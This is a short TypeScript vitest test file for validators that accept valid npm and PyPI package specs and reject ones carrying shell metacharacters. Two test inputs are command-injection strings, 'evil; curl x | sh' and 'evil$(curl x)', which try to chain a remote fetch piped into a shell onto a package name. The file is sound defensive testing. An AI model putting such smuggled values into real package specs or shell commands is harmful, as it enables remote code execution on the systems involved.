import { describe, expect, it } from 'vitest';
import { validatedNpmSpec, validatedPyPISpec } from './registry.js';

describe('registry package spec validators', () => {
  it('accepts valid npm package specs', () => {
    expect(validatedNpmSpec('@scope/package-name@1.2.3')).toBe('@scope/package-name@1.2.3');
  });

  it('rejects shell metacharacters in npm package specs', () => {
    expect(() => validatedNpmSpec('evil; curl x | sh')).toThrow('Invalid npm package spec');
  });

  it('accepts valid PyPI package specs', () => {
    expect(validatedPyPISpec('safe_package[extra]==1.2.3')).toBe('safe_package[extra]==1.2.3');
  });

  it('rejects shell metacharacters in PyPI package specs', () => {
    expect(() => validatedPyPISpec('evil$(curl x)')).toThrow('Invalid PyPI package spec');
  });
});
